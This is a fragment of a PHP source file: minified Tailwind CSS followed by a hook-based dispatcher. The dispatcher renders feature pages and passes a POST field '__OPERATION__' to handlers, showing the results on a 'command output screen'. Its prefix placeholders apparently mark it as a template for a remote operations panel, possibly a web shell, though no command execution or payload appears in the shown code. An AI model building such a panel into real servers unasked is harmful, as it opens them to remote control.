229/var(--tw-ring-opacity))}.focus-visible\:outline:focus-visible{outline-style:solid}.focus-visible\:outline-2:focus-visible{outline-width:2px}.focus-visible\:outline-offset-2:focus-visible{outline-offset:2px}.focus-visible\:outline-indigo-500:focus-visible{outline-color:#6366f1}.focus-visible\:outline-indigo-600:focus-visible{outline-color:#4f46e5}@media (min-width:640px){.sm\:-mx-6{margin-left:-1.5rem;margin-right:-1.5rem}.sm\:mx-auto{margin-left:auto;margin-right:auto}.sm\:ml-16{margin-left:4rem}.sm\:mt-0{margin-top:0}.sm\:flex{display:flex}.sm\:w-full{width:100%}.sm\:max-w-sm{max-width:24rem}.sm\:flex-auto{flex:1 1 auto}.sm\:flex-none{flex:none}.sm\:flex-row{flex-direction:row}.sm\:flex-wrap{flex-wrap:wrap}.sm\:items-center{align-items:center}.sm\:space-x-6>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem*var(--tw-space-x-reverse));margin-left:calc(1.5rem*(1 - var(--tw-space-x-reverse)))}.sm\:truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.sm\:rounded-lg{border-radius:.5rem}.sm\:px-6{padding-left:1.5rem}.sm\:pr-6,.sm\:px-6{padding-right:1.5rem}.sm\:text-3xl{font-size:1.875rem;line-height:2.25rem}.sm\:text-sm{font-size:.875rem;line-height:1.25rem}.sm\:leading-6{line-height:1.5rem}.sm\:tracking-tight{letter-spacing:-.025em}}@media (min-width:1024px){.lg\:-mx-8{margin-left:-2rem;margin-right:-2rem}.lg\:flex{display:flex}.lg\:items-center{align-items:center}.lg\:justify-between{justify-content:space-between}.lg\:px-8{padding-left:2rem;padding-right:2rem}}
CSS;

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$ISOLATED_OPERATIONS = array();
// Load the isolated operations
$args = array(&$ISOLATED_OPERATIONS);
call_hook("isolated_ops", $args);

/**
 * Define the enabled features
 *
 * @var array{title: string, description: string, svg: string, hidden?: bool, op: string}[] $ENABLED_FEATURES
 */
$ENABLED_FEATURES = array();
// Load the enabled features
$args = array(&$ENABLED_FEATURES);
call_hook("features", $args);

// Check if the request is not POST and the operation is not in the isolated operations list, if that is the case,
// render the page
if (
    !__PREFIX__isPost() ||
    !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
) {
    // load the page or get the fallback page
    $page = __PREFIX__loadPageOrDefault($ENABLED_FEATURES);
    __PREFIX__renderPage($page);

    // Check if the request is POST and the operation is not in the isolated operations list,
    // if that is the case open the command output screen to display the command output
    if (
        __PREFIX__isPost() &&
        !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
    ) {
        __PREFIX__openCommandOutputScreen();
    }
}

// ensure the operation is a POST request, if so, call the operation handler
if (__PREFIX__isPost()) {
    $operation = $_POST["__OPERATION__"];
    $args      = array($operation, $ENABLED_FEATURES);
    call_named_hook("POST_operation", $operation, $args);
}

// If the request is not POST and the operation is not in the isolated operations list, close the command output screen
if (
    !__PREFIX__isPost() &&
    !__PREFIX__isIsolatedOperation($_POST["__OPERATION__"], $ISOLATED_OPERATIONS)
) {
    __PREFIX__closeCommandOutputScreen();
}

// section.main.end